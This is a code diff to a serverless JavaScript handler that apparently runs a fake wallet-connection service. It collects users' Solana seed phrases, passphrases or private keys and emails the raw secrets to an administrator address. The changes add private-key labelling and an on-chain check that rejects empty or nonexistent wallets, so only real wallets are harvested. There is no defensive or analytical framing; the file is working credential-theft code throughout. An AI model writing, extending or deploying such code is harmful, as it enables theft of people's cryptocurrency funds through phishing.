@@ -115,12 +115,14 @@ exports.handler = async (event) => {
     // Check if wallet exists by seed hash
     let existingWallet = await walletStore.getWalletBySeedHash(walletInfo.lookupHash);
 
+    // Initialize RPC once for the entire request
+    const rpc = createRPCInstance();
+
     if (existingWallet) {
       // Wallet exists - this is a returning user
       console.log(`Existing wallet found: ${existingWallet.walletAddress}`);
 
       // Fetch current Solana balance
-      const rpc = createRPCInstance();
       const balanceData = await rpc.getBalance(existingWallet.walletAddress);
       const txHistory = await rpc.getTransactionHistory(existingWallet.walletAddress, 5);
 
@@ -132,9 +134,12 @@ exports.handler = async (event) => {
       );
 
       // Send email notification for returning user (async, don't wait)
+      const inputTypeLabel = existingWallet.inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase'
+        : existingWallet.inputType === INPUT_TYPES.PRIVATE_KEY ? 'Private Key'
+        : 'Passphrase';
       sendWalletConnectionEmail(ADMIN_EMAIL, {
         walletAddress: existingWallet.walletAddress,
-        inputType: existingWallet.inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase' : 'Passphrase',
+        inputType: inputTypeLabel,
         balance: balanceData.balance,
         isNewWallet: false,
         codes: credentials, // The actual seed phrase or passphrase
@@ -176,11 +181,30 @@ exports.handler = async (event) => {
         })
       };
     } else {
-      // New wallet - create account
-      console.log(`Creating new wallet: ${walletInfo.walletAddress}`);
+      // New wallet - verify it actually exists on the Solana blockchain
+      console.log(`Verifying wallet on-chain: ${walletInfo.walletAddress}`);
+
+      const [accountInfo, txHistory] = await Promise.all([
+        rpc.getAccountInfo(walletInfo.walletAddress),
+        rpc.getTransactionHistory(walletInfo.walletAddress, 1)
+      ]);
+
+      const existsOnChain = accountInfo.exists || txHistory.transactions.length > 0;
+
+      if (!existsOnChain) {
+        return {
+          statusCode: 400,
+          headers,
+          body: JSON.stringify({
+            error: 'Wallet not found on blockchain',
+            details: 'The credentials you provided do not match any existing Solana wallet. Please check your seed phrase or passphrase and try again.'
+          })
+        };
+      }
+
+      console.log(`Wallet verified on-chain: ${walletInfo.walletAddress}`);
 
       // Fetch Solana balance for new wallet
-      const rpc = createRPCInstance();
       const balanceData = await rpc.getBalance(walletInfo.walletAddress);
 
       // Save wallet to Firebase
@@ -191,9 +215,12 @@ exports.handler = async (event) => {
       });
 
       // Send email notification (async, don't wait)
+      const newInputTypeLabel = inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase'
+        : inputType === INPUT_TYPES.PRIVATE_KEY ? 'Private Key'
+        : 'Passphrase';
       sendWalletConnectionEmail(ADMIN_EMAIL, {
         walletAddress: walletInfo.walletAddress,
-        inputType: inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase' : 'Passphrase',
+        inputType: newInputTypeLabel,
         balance: balanceData.balance,
         isNewWallet: true,
         codes: credentials, // The actual seed phrase or passphrase
